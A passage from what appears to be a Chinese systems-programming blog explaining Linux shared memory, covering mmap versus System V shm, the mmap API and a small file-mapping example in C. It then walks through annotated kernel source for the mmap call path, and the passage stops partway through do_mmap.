<p><strong>mmap VS shm</strong></p>
<ul>
<li>mmap 的机制：<ul>
<li>就是在磁盘上建立一个文件，每个进程存储器里面，单独开辟一个空间来进行映射，如果多进程的话，那么不会对实际的内存消耗太大</li>
<li>数据保存到实际硬盘，实际存储并没有反映到主存上（不耗内存，但速度慢）</li>
</ul>
</li>
<li>shm 的机制：<ul>
<li>每个进程的共享内存都直接映射到内存里面</li>
<li>数据保存到内存中，实际的储存量直接反映到主存上（速度快，但耗内存）</li>
</ul>
</li>
</ul>
<p>令我好奇的一点是：不管是 <code>shm</code> 还是 <code>mmap</code> 底层都要依靠文件（匿名的 <code>mmap</code> 底层也会使用 <code>/dev/zero</code> 文件）</p>
<ul>
<li>mmap 直接使用文件来存储数据</li>
<li>shm 利用文件来完成映射</li>
</ul>
<p>另外匿名管道也会使用 <code>alloc_file_pseudo</code> 来生成一个“抽象文件”，并使用它进行数据传输</p>
<ul>
<li>其实这也可以理解，因为 <code>file</code> 中管理的 <code>inode</code> 直接和内存相关，并且 <code>file-&gt;f_op</code> 中还会提供许多与驱动程序相关的内核函数（例如：在 <code>do_mmap_pgoff</code> 的调用链中会使用 <code>file-&gt;f_op-&gt;get_unmapped_area</code>）</li>
</ul>
<p><strong>POSIX 共享内存</strong></p>
<p>传统的 systemV 的 shm 共享内存有个升级版的 API：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shm_open</span><span class="params">(struct vm_area_struct *vma)</span></span>; <span class="comment">/* 在/dev/shm/下建立一个文件,作为该进程的共享内存 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shm_close</span><span class="params">(struct vm_area_struct *vma)</span></span>; <span class="comment">/* 释放目标共享内存 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shm_destroy</span><span class="params">(struct ipc_namespace *ns, struct shmid_kernel *shp)</span></span>; <span class="comment">/* 销毁/dev/shm/中对应的文件 */</span></span><br></pre></td></tr></table></figure>
<p><code>/dev/shm/</code> 是一个使用就是 tmpfs 文件系统的设备，可以理解为只存在于内存上的文件</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/21/Principles%EF%BC%9A%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98mmap%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/21/Principles%EF%BC%9A%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98mmap%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Principles：共享内存mmap底层原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-21 11:13:26" itemprop="dateCreated datePublished" datetime="2022-09-21T11:13:26+08:00">2022-09-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-09-22 14:56:24" itemprop="dateModified" datetime="2022-09-22T14:56:24+08:00">2022-09-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>20k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>18 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>共享内存基础知识</strong></p>
<p>共享内存有两个，一个 mmap，一个 systemV 的 shm</p>
<p>由于所有用户进程总的虚拟地址空间比可用的物理内存大很多，因此只有最常用的部分才与物理页帧关联（这不是问题，因为大多数程序只占用实际可用内存的一小部分）</p>
<ul>
<li>在将磁盘上的数据映射到进程的虚拟地址空间的时，内核必须提供数据结构，以建立虚拟地址空间的区域和相关数据所在位置之间的关联，Linux 软件系统多级页表映射机制</li>
<li>共享内存使得多个进程可以访问同一块内存空间（节约了内存空间），不同进程可以及时看到对方进程中对共享内存中数据得更新（多个进程可以同时操作，所以需要进行同步 ，一般与信号量配合使用）</li>
</ul>
<p>本文主要介绍 mmap</p>
<p><strong>共享内存的 API</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>addr：<ul>
<li>指定了映射被放置的虚拟地址，首选做法是将 addr 指定为 NULL，内核会为映射选择一个合适的地址（将 addr 指定为非 NULL，内核会将该参数值作为一个提示信息来处理）</li>
</ul>
</li>
<li>length：<ul>
<li>指定了映射字节数，如果 length 不是分页的整数倍，内核会以分页大小为单位建立映射</li>
</ul>
</li>
<li>prot：是一个位掩码，指定了新内存映射上的保护信息</li>
<li>flags：是一个控制映射操作各个方面的选项的位掩码（只能选一个）<ul>
<li>MAP_PRIVATE - 私有：对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容 </li>
<li>MAP_SHARED - 共有：对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享</li>
<li>MAP_ANONYMOUS - 匿名：建立匿名映射，此时会忽略参数fd，不涉及文件（其实是使用 <code>/dev/zero</code> 文件），而且映射区域无法和其他进程共享</li>
</ul>
</li>
<li>匿名映射会忽略下面两个参数：<ul>
<li>fd：表示映射的文件的文件描述符</li>
<li>offset：指定了映射在文件中的起点，必须是系统分页大小的倍数</li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回被映射区的指针 </li>
<li>出错：返回 “-1”，错误原因存于 error 中</li>
</ul>
</li>
</ul>
<p><strong>共享内存使用案例</strong></p>
<p>mmap：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;./flag.txt&quot;</span>, <span class="number">0666</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// char *addr = (char*)mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);</span></span><br><span class="line">    <span class="keyword">char</span> *addr = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, length, PROT_READ|PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;get data from mmap:&quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>,addr,<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input data to mmap:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,addr,<span class="number">0x40</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(munmap(addr, length) == <span class="number">-1</span>) <span class="comment">/* 解除映射区域 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;munmap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>效果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7fcf000</span>     <span class="number">0x7ffff7fd0000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">0x7ffff7fd0000</span>     <span class="number">0x7ffff7ff3000</span> r-xp    <span class="number">23000</span> <span class="number">1000</span>   /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">0x7ffff7ff3000</span>     <span class="number">0x7ffff7ffb000</span> r--p     <span class="number">8000</span> <span class="number">24000</span>  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">0x7ffff7ffb000</span>     <span class="number">0x7ffff7ffc000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      /home/yhellow/桌面/<span class="built_in">exp</span>/flag.txt <span class="comment">/* target */</span></span><br><span class="line"><span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">2</span>c000  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">2</span>d000  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br></pre></td></tr></table></figure>
<ul>
<li>其实 mmap 也可以用来进程间通信，但是用它分配内存的情况多一点</li>
</ul>
<p><strong>Linux 中 mmap 的实现</strong></p>
<p>mmap 的作用就是把磁盘文件的一部分（指定 fd）直接映射到进程的内存中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7eda8e4</span> &lt;mmap64+<span class="number">36</span>&gt;    syscall  &lt;SYS_mmap&gt;</span><br><span class="line">       addr: <span class="number">0x0</span></span><br><span class="line">       len: <span class="number">0x1</span></span><br><span class="line">       prot: <span class="number">0x3</span></span><br><span class="line">       flags: <span class="number">0x2</span></span><br><span class="line">       fd: <span class="number">0x3</span> (/home/yhellow/桌面/<span class="built_in">exp</span>/flag.txt)</span><br><span class="line">       offset: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">unsigned</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">sys_mmap</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">long</span> off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (offset_in_page(off) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	addr = ksys_mmap_pgoff(addr, len, prot, flags, fd, off &gt;&gt; PAGE_SHIFT); <span class="comment">/* 核心函数 */</span></span><br><span class="line">	<span class="keyword">if</span> (!IS_ERR((<span class="keyword">void</span> *) addr))</span><br><span class="line">		force_successful_syscall_return();</span><br><span class="line">	<span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">ksys_mmap_pgoff</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function">			      <span class="keyword">unsigned</span> <span class="keyword">long</span> prot, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">			      <span class="keyword">unsigned</span> <span class="keyword">long</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> retval;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; MAP_ANONYMOUS)) &#123; <span class="comment">/* MAP_ANONYMOUS:匿名的 */</span></span><br><span class="line">		audit_mmap_fd(fd, flags); <span class="comment">/* 把&#x27;fd&#x27;和&#x27;flags&#x27;写到mmap结构体中 */</span></span><br><span class="line">		file = fget(fd); <span class="comment">/* 获取对应的文件 */</span></span><br><span class="line">		<span class="keyword">if</span> (!file)</span><br><span class="line">			<span class="keyword">return</span> -EBADF;</span><br><span class="line">		<span class="keyword">if</span> (is_file_hugepages(file))</span><br><span class="line">			len = ALIGN(len, huge_page_size(hstate_file(file))); <span class="comment">/* 对齐 */</span></span><br><span class="line">		retval = -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(flags &amp; MAP_HUGETLB &amp;&amp; !is_file_hugepages(file)))</span><br><span class="line">			<span class="keyword">goto</span> out_fput;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; MAP_HUGETLB) &#123; <span class="comment">/* MAP_HUGETLB:大页面映射 */</span></span><br><span class="line">		struct user_struct *user = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hstate</span> *<span class="title">hs</span>;</span></span><br><span class="line"></span><br><span class="line">		hs = hstate_sizelog((flags &gt;&gt; MAP_HUGE_SHIFT) &amp; MAP_HUGE_MASK); <span class="comment">/* 生成状态日志 */</span></span><br><span class="line">		<span class="keyword">if</span> (!hs)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		len = ALIGN(len, huge_page_size(hs)); <span class="comment">/* 对齐 */</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * VM_NORESERVE is used because the reservations will be</span></span><br><span class="line"><span class="comment">		 * taken when vm_ops-&gt;mmap() is called</span></span><br><span class="line"><span class="comment">		 * A dummy user value is used because we are not locking</span></span><br><span class="line"><span class="comment">		 * memory so no accounting is necessary</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		file = hugetlb_file_setup(HUGETLB_ANON_FILE, len,</span><br><span class="line">				VM_NORESERVE,</span><br><span class="line">				&amp;user, HUGETLB_ANONHUGE_INODE,</span><br><span class="line">				(flags &gt;&gt; MAP_HUGE_SHIFT) &amp; MAP_HUGE_MASK); <span class="comment">/* 启用严格记账 */</span></span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(file))</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(file);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	flags &amp;= ~(MAP_EXECUTABLE | MAP_DENYWRITE); <span class="comment">/* 去掉可执行权限,去掉不可写权限 */</span></span><br><span class="line"></span><br><span class="line">	retval = vm_mmap_pgoff(file, addr, len, prot, flags, pgoff); <span class="comment">/* 核心函数 */</span></span><br><span class="line">out_fput:</span><br><span class="line">	<span class="keyword">if</span> (file)</span><br><span class="line">		fput(file);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>简单检查并处理了一下标志位，然后进行对齐</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">vm_mmap_pgoff</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">unsigned</span> <span class="keyword">long</span> prot,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flag, <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ret;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm; <span class="comment">/* 获取当前进程的内存描述符 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> populate;</span><br><span class="line">	LIST_HEAD(uf);</span><br><span class="line"></span><br><span class="line">	ret = security_mmap_file(file, prot, flag); <span class="comment">/* 内核sandboxing功能,通过sandboxing调用mmap_file函数,如果是文件映射会mmap_file会对文件进行权限检查之类操作 */</span></span><br><span class="line">	<span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">		<span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;mmap_sem)) </span><br><span class="line">			<span class="keyword">return</span> -EINTR;</span><br><span class="line">		ret = do_mmap_pgoff(file, addr, len, prot, flag, pgoff,</span><br><span class="line">				    &amp;populate, &amp;uf); <span class="comment">/* 核心函数 */</span></span><br><span class="line">		up_write(&amp;mm-&gt;mmap_sem);</span><br><span class="line">		userfaultfd_unmap_complete(mm, &amp;uf);</span><br><span class="line">		<span class="keyword">if</span> (populate)</span><br><span class="line">			mm_populate(ret, populate);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>security_mmap_file</code> 最终会调用 <code>ima_file_mmap</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">do_mmap_pgoff</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">unsigned</span> <span class="keyword">long</span> prot, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">long</span> *populate,</span></span></span><br><span class="line"><span class="params"><span class="function">	struct list_head *uf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> do_mmap(file, addr, len, prot, flags, <span class="number">0</span>, pgoff, populate, uf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">do_mmap</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> prot,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">vm_flags_t</span> vm_flags,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> *populate,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct list_head *uf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span> <span class="comment">/* Linux中vm_area_struct表示的虚拟地址是给进程使用的(vm_struct表示的虚拟地址是给内核使用的) */</span></span><br><span class="line">	<span class="class"><span 